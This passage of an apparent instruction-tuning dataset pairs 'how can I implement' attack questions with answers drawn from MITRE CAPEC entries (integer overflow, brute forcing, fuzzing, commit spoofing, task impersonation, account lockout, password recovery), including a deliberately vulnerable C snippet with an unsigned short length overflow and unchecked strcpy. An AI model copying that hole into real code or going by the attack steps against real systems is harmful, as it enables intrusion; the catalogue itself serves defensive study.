            "Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544",
            {
              "xhtml:p": "The following code illustrates an integer overflow. The declaration of total integer as \"unsigned short int\" assumes that the length of the first and second arguments fits in such an integer [REF-547], [REF-548].",
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:br": null,
                    "#text": "printf(\"Usage: prog_name <string1> <string2>\\n\");exit(-1);"
                  },
                  "xhtml:br": [
                    null,
                    null,
                    null,
                    null,
                    null,
                    null
                  ],
                  "#text": "if (argc !=3){\n                     }unsigned short int total;total = strlen(argv[1])+strlen(argv[2])+1;char * buff = (char *)malloc(total);strcpy(buff, argv[1]);strcpy(buff, argv[2]);"
                },
                "#text": "include <stdlib.h>include <string.h>include <stdio.h>\n                  int main (int argc, char *const *argv){\n                  }"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "190"
            },
            {
              "@CWE_ID": "128"
            },
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "122"
            },
            {
              "@CWE_ID": "196"
            },
            {
              "@CWE_ID": "680"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "03",
            "Entry_Name": "Integer Overflows"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-131"
            },
            {
              "@External_Reference_ID": "REF-547",
              "@Section": "Test Case ID 1511"
            },
            {
              "@External_Reference_ID": "REF-548",
              "@Section": "Page 152, Figure 5-1"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations, References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Encryption Brute Forcing (CAPEC ID: 20)",
    "context": "",
    "output": "Examples of Encryption Brute Forcing (CAPEC ID: 20) are: In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.",
      "@Name": "Encryption Brute Forcing (CAPEC ID: 20)",
      "attack_ptrn": {
        "@ID": "20",
        "@Name": "Encryption Brute Forcing",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "112"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "668"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Determine the ciphertext and the encryption algorithm."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Ciphertext is known.",
            "Encryption algorithm and key size are known."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Brute forcing encryption does not require much skill."
          }
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).",
              "On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext.",
              "Obviously as N gets large the brute force approach becomes infeasible."
            ]
          }
        },
        "Indicators": {
          "Indicator": "None. This attack happens offline."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.",
            "In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months."
          ]
        },
        "Example_Instances": {
          "Example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "326"
            },
            {
              "@CWE_ID": "327"
            },
            {
              "@CWE_ID": "693"
            },
            {
              "@CWE_ID": "1204"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2021-06-24",
            "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Fuzzing (CAPEC ID: 28)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system.",
      "@Name": "Fuzzing (CAPEC ID: 28)",
      "attack_ptrn": {
        "@ID": "28",
        "@Name": "Fuzzing",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve their goals.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.",
              "Technique": [
                "Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.",
                "Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.",
                "Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.",
              "Technique": [
                "Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).",
                "Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.",
              "Technique": [
                "Identify and embed shell code for the target system.",
                "Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.)",
                "Induce denial of service by exploiting resource leaks or bad error handling."
              ]
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "There is a wide variety of fuzzing tools available."
          }
        },
        "Resources_Required": {
          "Resource": "Fuzzing tools."
        },
        "Indicators": {
          "Indicator": "A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Alter Execution Logic"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.",
            "Use fuzz testing during the software QA process to uncover any surprises, uncover any assumptions or unexpected behavior."
          ]
        },
        "Example_Instances": {
          "Example": "A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Spoof Version Control System Commit Metadata (CAPEC ID: 692)",
    "context": "",
    "output": "In July 2022, Checkmarx reported that GitHub commit metadata could be spoofed if unsigned commits were leveraged by the repository. Adversaries were able to spoof commit contributors, as well as the date/time of the commit. This resulted in commits appearing to originate from trusted developers and a GitHub activity graph that duped users into believing that the repository had been maintained for a significant period of time. The lack of commit metadata validation ultimately allowed adversaries to propagate malware to unsuspecting victims [REF-719] [REF-720].",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In July 2022, Checkmarx reported that GitHub commit metadata could be spoofed if unsigned commits were leveraged by the repository. Adversaries were able to spoof commit contributors, as well as the date/time of the commit. This resulted in commits appearing to originate from trusted developers and a GitHub activity graph that duped users into believing that the repository had been maintained for a significant period of time. The lack of commit metadata validation ultimately allowed adversaries to propagate malware to unsuspecting victims [REF-719] [REF-720].",
      "@Name": "Spoof Version Control System Commit Metadata (CAPEC ID: 692)",
      "attack_ptrn": {
        "@ID": "692",
        "@Name": "Spoof Version Control System Commit Metadata",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary spoofs metadata pertaining to a Version Control System (VCS) (e.g., Git) repository's commits to deceive users into believing that the maliciously provided software is frequently maintained and originates from a trusted source."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Version Control Systems are widely used by developers to host, track, and manage source code files in an easy and synchronous manner. These systems are often leveraged to host open-source software that other developers can incorporate into their own applications or use as standalone applications. To prevent downloading vulnerable and/or malicious code, developers will often check the metadata of VCS repository commits to determine the repository's overall pedigree. This may include a variety of information, such as the following:",
            "These precursory checks can assist developers in determining whether a trusted individual/organization is providing the source code, how often the code is updated, and the relative popularity of the software. However, an adversary can spoof this metadata to make a repository containing malicious code appear as originating from a trusted source, being frequently maintained, and being commonly used by other developers. Without performing additional security activities, unassuming developers may be duped by this spoofed metadata and include the malicious code within their systems/applications. The adversary is then ultimately able to achieve numerous negative technical impacts, while the victim remains unaware of any malicious activity."
          ],
          "xhtml:ul": {
            "xhtml:li": [
              "Owner of the repository",
              "Author(s) of commits",
              "Frequency of commits",
              "Date/Time of commits",
              "Repository activity graphs"
            ]
          }
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "691"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target] The adversary must first identify a target repository for them to spoof. Typically, this will be a popular and widely used repository, as to increase the amount of victims a successful attack will exploit."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Create malicious repository] The adversary must create a malicious repository that imitates the legitimate repository being spoofed. This may include creating a username that closely matches the legitimate repository owner; creating a repository name that closely matches the legitimate repository name; uploading the legitimate source code; and more."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Spoof commit metadata] Once the malicious repository has been created, the adversary must then spoof the commit metadata to make the repository appear to be frequently maintained and originating from trusted sources.",
              "Technique": [
                "Git Commit Timestamps: The adversary generates numerous fake commits while setting the \"GIT_AUTHOR_DATE\" and \"GIT_COMMITTER_DATE\" environment variables to a date which is to be spoofed.",
                "Git Commit Contributors: The adversary obtains a legitimate and trusted user's email address and then sets this information via the \"git config\" command. The adversary can then commit changes leveraging this username."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Exploit victims] The adversary infiltrates software and/or system environments with the goal of conducting additional attacks.",
              "Technique": [
                "Active: The adversary attempts to trick victims into downloading the malicious software by means such as phishing and social engineering.",
                "Passive: The adversary waits for victims to download and leverage malicious software."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Identification of a popular open-source repository whose metadata is to be spoofed."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Ability to spoof a variety of repository metadata to convince victims the source is trusted."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Accountability",
              "Impact": "Hide Activities"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Execute Unauthorized Commands",
                "Alter Execution Logic",
                "Gain Privileges"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Before downloading open-source software, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.",
            "Reference vulnerability databases to determine if the software contains known vulnerabilities.",
            "Only download open-source software from reputable hosting sites or package managers.",
            "Only download open-source software that has been adequately signed by the developer(s). For repository commits/tags, look for the \"Verified\" status and for developers leveraging \"Vigilant Mode\" (GitHub) or similar modes.",
            "After downloading open-source software, ensure integrity values have not changed.",
            "Before executing or incorporating the software, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously."
          ]
        },
        "Example_Instances": {
          "Example": "In July 2022, Checkmarx reported that GitHub commit metadata could be spoofed if unsigned commits were leveraged by the repository. Adversaries were able to spoof commit contributors, as well as the date/time of the commit. This resulted in commits appearing to originate from trusted developers and a GitHub activity graph that duped users into believing that the repository had been maintained for a significant period of time. The lack of commit metadata validation ultimately allowed adversaries to propagate malware to unsuspecting victims [REF-719] [REF-720]."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-719"
            },
            {
              "@External_Reference_ID": "REF-720"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2022-09-29"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Task Impersonation (CAPEC ID: 504)",
    "context": "",
    "output": "Possible examples: An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.\n- An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.",
        "An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges."
      ],
      "@Name": "Task Impersonation (CAPEC ID: 504)",
      "attack_ptrn": {
        "@ID": "504",
        "@Name": "Task Impersonation",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary, through a previously installed malicious application, impersonates an expected or routine task in an attempt to steal sensitive information or leverage a user's privileges.",
        "Extended_Description": {
          "xhtml:p": [
            "When impersonating an expected task, the adversary monitors the task list maintained by the operating system and waits for a specific legitimate task to become active. Once the task is detected, the malicious application launches a new task in the foreground that mimics the user interface of the legitimate task. At this point, the user thinks that they are interacting with the legitimate task that they started, but instead they are interacting with the malicious application. Once the adversary's goal is reached, the malicious application can exit, leaving the original trusted application visible and the appearance that nothing out of the ordinary has occurred.",
            "A second approach entails the adversary impersonating an unexpected task, but one that may often be spawned by legitimate background processes. For example, an adversary may randomly impersonate a system credential prompt, implying that a background process requires authentication for some purpose. The user, believing they are interacting with a legitimate task, enters their credentials or authorizes the use of their stored credentials, which the adversary then leverages for nefarious purposes. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user, but may also be used to ride the user's privileges."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "173",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing sensitive information.",
              "Technique": [
                "Determine what tasks prompt a user for their credentials.",
                "Determine what tasks may prompt a user to authorize a process to execute with elevated privileges."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials or to ride the user's privileges.",
              "Technique": [
                "Prompt a user for their credentials, while making the user believe the credential request is legitimate.",
                "Prompt a user to authorize a task to run with elevated privileges, while making the user believe the request is legitimate."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary must already have access to the target system via some means.",
            "A legitimate task must exist that an adversary can impersonate to glean credentials.",
            "The user's privileges allow them to execute certain tasks with elevated privileges."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary has gained access to the target system, impersonating a task is trivial."
          }
        },
        "Resources_Required": {
          "Resource": [
            "Malware or some other means to initially comprise the target system.",
            "Additional malware to impersonate a legitimate task."
          ]
        },
        "Indicators": {
          "Indicator": "Credential or permission elevation prompts that appear illegitimate or unexpected."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Access Control",
              "Authentication"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": "The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help."
        },
        "Example_Instances": {
          "Example": [
            "An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.",
            "An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1021"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1036.004",
            "Entry_Name": "Masquerading: Masquerade Task or Service"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-434",
            "@Section": "4.1.2 Man-In-The-Middle"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Abstraction, @Status, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, Resources_Required, Skills_Required, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Inducing Account Lockout (CAPEC ID: 2)",
    "context": "",
    "output": "Possible examples: A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.",
      "@Name": "Inducing Account Lockout (CAPEC ID: 2)",
      "attack_ptrn": {
        "@ID": "2",
        "@Name": "Inducing Account Lockout",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "212",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout",
              "Technique": [
                "Analyze system documentation to find list of events that could potentially cause account lockout",
                "Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly",
                "Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out",
              "Technique": [
                "Obtain list of authorized users using another attack pattern, such as SQL Injection.",
                "Attempt to create accounts if possible; system should indicate if a user ID is already taken.",
                "Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.",
              "Technique": "For each user ID to be locked out, perform the lockout procedure discovered in the first step."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system has a lockout mechanism.",
            "An attacker must be able to reproduce behavior that would result in an account being locked."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above."
          }
        },
        "Resources_Required": {
          "Resource": "Computer with access to the login portion of the target system"
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": "Resource Consumption",
            "Note": "Denial of Service"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.",
            "When implementing security features, consider how they can be misused and made to turn on themselves."
          ]
        },
        "Example_Instances": {
          "Example": "A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "645"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1531",
            "Entry_Name": "Account Access Removal"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Password Recovery Exploitation (CAPEC ID: 50)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: An attacker clicks on the \"forgot password\" and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An attacker clicks on the \"forgot password\" and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system."
      ],
      "@Name": "Password Recovery Exploitation (CAPEC ID: 50)",
      "attack_ptrn": {
